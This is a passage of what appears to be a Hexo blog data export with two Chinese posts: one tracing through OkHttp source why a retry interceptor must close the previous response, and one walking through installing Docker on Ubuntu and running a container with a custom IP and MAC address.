class=\"line\">      <span class=\"keyword\">if</span> (!exchangeResponseDone) changed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchangeResponseDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 其实从这里的语义就能看出，只有responseDone了，exchange才会置空，正好对应response.close()</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exchangeRequestDone &amp;&amp; exchangeResponseDone &amp;&amp; changed) &#123;</span><br><span class=\"line\">      exchangeDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchange.connection().successCount++;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchange = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (exchangeDone) &#123;</span><br><span class=\"line\">    e = maybeReleaseConnection(e, <span class=\"literal\">false</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> e;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>回溯一部分调用路径：</strong><br>ResponseBodySource#close -&gt; complete –&gt; Exchange#bodyComplete –&gt; Transmitter#exchangeMessageDone<br><strong>然后从Response的close方法开始看</strong>：<br>其实就是调用了ResponseBody的close：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">close</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  Util.closeQuietly(source());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// source是一个抽象方法，返回的BufferedSource是一个Closeable</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> BufferedSource <span class=\"title function_\">source</span><span class=\"params\">()</span>;</span><br></pre></td></tr></table></figure>\n\n<p>RealResponseBody进行了实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RealResponseBody</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ResponseBody</span> &#123;</span><br><span class=\"line\">  ……</span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> BufferedSource source;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"title function_\">RealResponseBody</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">      <span class=\"meta\">@Nullable</span> String contentTypeString, <span class=\"type\">long</span> contentLength, BufferedSource source)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.contentTypeString = contentTypeString;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.contentLength = contentLength;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.source = source;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ……</span><br><span class=\"line\">  <span class=\"meta\">@Override</span> <span class=\"keyword\">public</span> BufferedSource <span class=\"title function_\">source</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> source;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正好对应Exchange的openResponseBody方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> ResponseBody <span class=\"title function_\">openResponseBody</span><span class=\"params\">(Response response)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    ……</span><br><span class=\"line\">    <span class=\"type\">ResponseBodySource</span> <span class=\"variable\">source</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodySource</span>(rawSource, contentLength);</span><br><span class=\"line\">    <span class=\"comment\">// 将ResponseBodySource的实例作为RealResponseBody的source传入</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RealResponseBody</span>(contentType, contentLength, Okio.buffer(source));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">    eventListener.responseFailed(call, e);</span><br><span class=\"line\">    trackFailure(e);</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> e;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>调用就这样合龙了。<br>所以我们调用Response#close方法最终就会走到Transmitter#exchangeMessageDone，对exchange置空，这样就不会抛出那个异常了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>OkHttp自定义重试拦截器常见实现方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RetryInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">retryCount</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        okhttp3.<span class=\"type\">Response</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> chain.proceed(request);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!response.isSuccessful() &amp;&amp; retryCount &lt; RETRY_MAX_COUNT) &#123;</span><br><span class=\"line\">            retryCount++;</span><br><span class=\"line\">            response = chain.proceed(request);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是没有人告诉我，在3.14.x版本上会出现这个异常：</p>\n<blockquote>\n<p>AndroidRuntime: java.lang.IllegalStateException: cannot make a new request because the previous response is still open: please call response.close()</p>\n</blockquote>\n<p>第一反应去OkHttp的issue查查，果然有和我同病相怜的：<br><a href=\"https://github.com/square/okhttp/issues/4986\">https://github.com/square/okhttp/issues/4986</a></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (!response.isSuccessful() &amp;&amp; retryCount &lt; RETRY_MAX_COUNT) &#123;</span><br><span class=\"line\">    retryCount++;</span><br><span class=\"line\">    response.close(); <span class=\"comment\">// 很简单，加上这一句</span></span><br><span class=\"line\">    response = chain.proceed(request);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"调查\"><a href=\"#调查\" class=\"headerlink\" title=\"调查\"></a>调查</h3><p>虽说很快就解决了，但是要是异常提示不告诉你要close呢，我们就要自己去探索了。所以还是忍不住扒下来源码看了看，搜索这个异常提示位于：<br><strong>okhttp&#x2F;src&#x2F;main&#x2F;java&#x2F;okhttp3&#x2F;internal&#x2F;connection&#x2F;Transmitter.java</strong><br>可以看到，是在newExchange方法中抛出的异常：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">/** Returns a new exchange to carry a new request and response. */</span></span><br><span class=\"line\"> Exchange <span class=\"title function_\">newExchange</span><span class=\"params\">(Interceptor.Chain chain, <span class=\"type\">boolean</span> doExtensiveHealthChecks)</span> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (noMoreExchanges) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">&quot;released&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (exchange != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">&quot;cannot make a new request because the previous response &quot;</span></span><br><span class=\"line\">           + <span class=\"string\">&quot;is still open: please call response.close()&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">……</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了简单点，我们就直接搜索exchange在什么时候置的空，之所以response.close()能解决问题那就说明close方法最终会调用到exchange &#x3D; null。查出来2个地方：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 第一个调用处是来自RetryAndFollowUpInterceptor这一内部重试实现，此处可以忽略</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exchangeDoneDueToException</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (noMoreExchanges) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>();</span><br><span class=\"line\">    exchange = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这个方法应该才是最终调用</span></span><br><span class=\"line\"><span class=\"meta\">@Nullable</span> IOException <span class=\"title function_\">exchangeMessageDone</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    Exchange exchange, <span class=\"type\">boolean</span> requestDone, <span class=\"type\">boolean</span> responseDone, <span class=\"meta\">@Nullable</span> IOException e)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">exchangeDone</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exchange != <span class=\"built_in\">this</span>.exchange) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> e; <span class=\"comment\">// This exchange was detached violently!</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">changed</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (requestDone) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!exchangeRequestDone) changed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchangeRequestDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (responseDone) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!exchangeResponseDone) changed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchangeResponseDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 其实从这里的语义就能看出，只有responseDone了，exchange才会置空，正好对应response.close()</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exchangeRequestDone &amp;&amp; exchangeResponseDone &amp;&amp; changed) &#123;</span><br><span class=\"line\">      exchangeDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchange.connection().successCount++;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchange = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (exchangeDone) &#123;</span><br><span class=\"line\">    e = maybeReleaseConnection(e, <span class=\"literal\">false</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> e;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>回溯一部分调用路径：</strong><br>ResponseBodySource#close -&gt; complete –&gt; Exchange#bodyComplete –&gt; Transmitter#exchangeMessageDone<br><strong>然后从Response的close方法开始看</strong>：<br>其实就是调用了ResponseBody的close：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">close</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  Util.closeQuietly(source());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// source是一个抽象方法，返回的BufferedSource是一个Closeable</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> BufferedSource <span class=\"title function_\">source</span><span class=\"params\">()</span>;</span><br></pre></td></tr></table></figure>\n\n<p>RealResponseBody进行了实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RealResponseBody</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ResponseBody</span> &#123;</span><br><span class=\"line\">  ……</span><br><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> BufferedSource source;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"title function_\">RealResponseBody</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">      <span class=\"meta\">@Nullable</span> String contentTypeString, <span class=\"type\">long</span> contentLength, BufferedSource source)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.contentTypeString = contentTypeString;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.contentLength = contentLength;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.source = source;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ……</span><br><span class=\"line\">  <span class=\"meta\">@Override</span> <span class=\"keyword\">public</span> BufferedSource <span class=\"title function_\">source</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> source;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正好对应Exchange的openResponseBody方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> ResponseBody <span class=\"title function_\">openResponseBody</span><span class=\"params\">(Response response)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    ……</span><br><span class=\"line\">    <span class=\"type\">ResponseBodySource</span> <span class=\"variable\">source</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodySource</span>(rawSource, contentLength);</span><br><span class=\"line\">    <span class=\"comment\">// 将ResponseBodySource的实例作为RealResponseBody的source传入</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RealResponseBody</span>(contentType, contentLength, Okio.buffer(source));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">    eventListener.responseFailed(call, e);</span><br><span class=\"line\">    trackFailure(e);</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> e;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>调用就这样合龙了。<br>所以我们调用Response#close方法最终就会走到Transmitter#exchangeMessageDone，对exchange置空，这样就不会抛出那个异常了。</p>\n"},{"layout":"post","title":"Docker安装Ubuntu镜像并保存且修改IP及Mac地址","subtitle":"入坑易，出坑难。","date":"2019-09-20T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 本文仅作为一个Docker入坑笔记。\n> 主要介绍：\n> 1、Docker在Linux上的安装配置；\n> 2、在Docker容器中安装一个Ubuntu镜像并保存更改；\n> 3、以任意IP地址和Mac地址启动刚才安装的Ubuntu镜像。\n\n### 运行环境\n简介一下我的环境，方便参考：**Linux 4.15.0-64-generic #73~16.04.1-Ubuntu SMP Fri Sep 13 09:56:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux**\n\n### Docker安装配置\n无论何时，都要先找官方文档，对于入门来说，这比任何东西都管用。这里以Ubuntu为例，其他系统类似。\n起手update源：\n```bash\nsudo apt-get update\n```\n装一些必要的工具（一般来说不是刚装系统的话，都可以略过此步）：\n```bash\nsudo apt-get install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    gnupg-agent \\\n    software-properties-common\n```\n添加官方key：\n```bash\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n```\n验证一下搞对没得：\n```bash\nsudo apt-key fingerprint 0EBFCD88\n```\n如果输出：\n> pub   rsa4096 2017-02-22 [SCEA]\n>    9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88\n> uid           [ unknown] Docker Release (CE deb) <docker@docker.com>\n> sub   rsa4096 2017-02-22 [S]\n\n就没问题。\n接下来配置稳定版仓库（这里仅示例x86_64 / amd64架构的处理器）：\n```bash\nsudo add-apt-repository \\\n   \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) \\\n   stable\"\n# 再更新一下源\nsudo apt-get update\n```\n妈耶，终于可以安装Docker了，走起：\n```bash\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n```\n我安装的时候要下载390MB，看来Docker还是挺大的一个项目。\n最后测试一下OK不，跑个HelloWorld：\n```bash\nsudo docker run hello-world\n```\n\n### 安装Ubuntu镜像\n#### 安装\n对，我要在Ubuntu系统上的Docker里面再装一个Ubuntu，可以理解成Ubuntu套娃！\n先搜索一下：\n```bash\nsudo docker search ubuntu\n```\n就可以看到各种Ubuntu镜像，然后我们当然是拉取第一个官方的：\n```bash\nsudo docker pull ubuntu\n```\n然后查看一下你已有的镜像：\n```bash\nsudo docker images\n```\n会看到刚才安装的hello-world和ubuntu。\n#### 运行\n现在我们来运行这个套娃Ubuntu：\n```bash\nsudo docker run -ti ubuntu\n```\n进入之后你的终端就会切换成：\n```bash\nroot@7c529c6e5b94:/#\n```\n这个**7c529c6e5b94**每次都不一样，可以理解成git中的commit id，等会儿保存镜像时需要用到。\n#### 保存\n然后我们在这个Ubuntu镜像中可以瞎搞一些事情，比如安装wget啊，net-tools啊等等。退出套娃Ubuntu：\n```bash\nroot@7c529c6e5b94:/# exit\n```\n搞完了就可以提交保存了，第一个参数是刚才的id，第二个参数是给镜像设置一个自定义名称，并加上latest的tag：\n```bash\nsudo docker commit 7c529c6e5b94 my-ubuntu-img:latest\n```\n下一次再进入自己保存的镜像时直接：\n```bash\nsudo docker run -ti my-ubuntu-img\n```\n即可。\n\n### 自定义Mac和IP地址\n#### Mac地址\n如果想给刚才的套娃Ubuntu设置一个Mac地址，很简单，直接带参数run就行啦：\n```bash\nsudo docker run -ti --mac-address xx:xx:xx:xx:xx:xx my-ubuntu-img\n```\n进入系统之后可以看看是否设置成功：\n```bash\nifconfig -a\n# 如果提示没有ifconfig命令，需要先安装net-tools\nsudo apt-get install net-tools\n```\n#### IP地址\n我们需要先在Docker中创建一个自定义网络类型，同时指定网段（这里示例命名为my-net）：\n```bash\nsudo docker network create --subnet=192.168.0.0/16 my-net\n```\n然后可以通过network命令查看：\n```bash\nsudo docker network ls\n```\n使用自定义的IP启动容器：\n```bash\nsudo docker run -it --network my-net --ip 192.168.0.2 my-ubuntu-img\n```\n结合上述的Mac地址参数，两者同时修改就是：\n```bash\nsudo docker run -it --mac-address xx:xx:xx:xx:xx:xx --network my-net --ip 192.168.0.2 my-ubuntu-img\n```\n\n### 参考\n[https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/)\n[https://blog.csdn.net/mtgege/article/details/78462290](https://blog.csdn.net/mtgege/article/details/78462290)\n[https://blog.csdn.net/wanghao_0206/article/details/79583325](https://blog.csdn.net/wanghao_0206/article/details/79583325)\n","source":"_posts/2019-09-21-Docker安装Ubuntu镜像并保存且修改IP及Mac地址.md","raw":"---\nlayout:     post\ntitle:      Docker安装Ubuntu镜像并保存且修改IP及Mac地址\nsubtitle:   入坑易，出坑难。\ndate:       2019-09-21\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - Linux\n    - 后端\n---\n\n> 本文仅作为一个Docker入坑笔记。\n> 主要介绍：\n> 1、Docker在Linux上的安装配置；\n> 2、在Docker容器中安装一个Ubuntu镜像并保存更改；\n> 3、以任意IP地址和Mac地址启动刚才安装的Ubuntu镜像。\n\n### 运行环境\n简介一下我的环境，方便参考：**Linux 4.15.0-64-generic #73~16.04.1-Ubuntu SMP Fri Sep 13 09:56:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux**\n\n### Docker安装配置\n无论何时，都要先找官方文档，对于入门来说，这比任何东西都管用。这里以Ubuntu为例，其他系统类似。\n起手update源：\n```bash\nsudo apt-get update\n```\n装一些必要的工具（一般来说不是刚装系统的话，都可以略过此步）：\n```bash\nsudo apt-get install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    gnupg-agent \\\n    software-properties-common\n```\n添加官方key：\n```bash\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n```\n验证一下搞对没得：\n```bash\nsudo apt-key fingerprint 0EBFCD88\n```\n如果输出：\n> pub   rsa4096 2017-02-22 [SCEA]\n>    9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88\n> uid           [ unknown] Docker Release (CE deb) <docker@docker.com>\n> sub   rsa4096 2017-02-22 [S]\n\n就没问题。\n接下来配置稳定版仓库（这里仅示例x86_64 / amd64架构的处理器）：\n```bash\nsudo add-apt-repository \\\n   \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) \\\n   stable\"\n# 再更新一下源\nsudo apt-get update\n```\n妈耶，终于可以安装Docker了，走起：\n```bash\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n```\n我安装的时候要下载390MB，看来Docker还是挺大的一个项目。\n最后测试一下OK不，跑个HelloWorld：\n```bash\nsudo docker run hello-world\n```\n\n### 安装Ubuntu镜像\n#### 安装\n对，我要在Ubuntu系统上的Docker里面再装一个Ubuntu，可以理解成Ubuntu套娃！\n先搜索一下：\n```bash\nsudo docker search ubuntu\n```\n就可以看到各种Ubuntu镜像，然后我们当然是拉取第一个官方的：\n```bash\nsudo docker pull ubuntu\n```\n然后查看一下你已有的镜像：\n```bash\nsudo docker images\n```\n会看到刚才安装的hello-world和ubuntu。\n#### 运行\n现在我们来运行这个套娃Ubuntu：\n```bash\nsudo docker run -ti ubuntu\n```\n进入之后你的终端就会切换成：\n```bash\nroot@7c529c6e5b94:/#\n```\n这个**7c529c6e5b94**每次都不一样，可以理解成git中的commit id，等会儿保存镜像时需要用到。\n#### 保存\n然后我们在这个Ubuntu镜像中可以瞎搞一些事情，比如安装wget啊，net-tools啊等等。退出套娃Ubuntu：\n```bash\nroot@7c529c6e5b94:/# exit\n```\n搞完了就可以提交保存了，第一个参数是刚才的id，第二个参数是给镜像设置一个自定义名称，并加上latest的tag：\n```bash\nsudo docker commit 7c529c6e5b94 my-ubuntu-img:latest\n```\n下一次再进入自己保存的镜像时直接：\n```bash\nsudo docker run -ti my-ubuntu-img\n```\n即可。\n\n### 自定义Mac和IP地址\n#### Mac地址\n如果想给刚才的套娃Ubuntu设置一个Mac地址，很简单，直接带参数run就行啦：\n```bash\nsudo docker run -ti --mac-address xx:xx:xx:xx:xx:xx my-ubuntu-img\n```\n进入系统之后可以看看是否设置成功：\n```bash\nifconfig -a\n# 如果提示没有ifconfig命令，需要先安装net-tools\nsudo apt-get install net-tools\n```\n#### IP地址\n我们需要先在Docker中创建一个自定义网络类型，同时指定网段（这里示例命名为my-net）：\n```bash\nsudo docker network create --subnet=192.168.0.0/16 my-net\n```\n然后可以通过network命令查看：\n```bash\nsudo docker network ls\n```\n使用自定义的IP启动容器：\n```bash\nsudo docker run -it --network my-net --ip 192.168.0.2 my-ubuntu-img\n```\n结合上述的Mac地址参数，两者同时修改就是：\n```bash\nsudo docker run -it --mac-address xx:xx:xx:xx:xx:xx --network my-net --ip 192.168.0.2 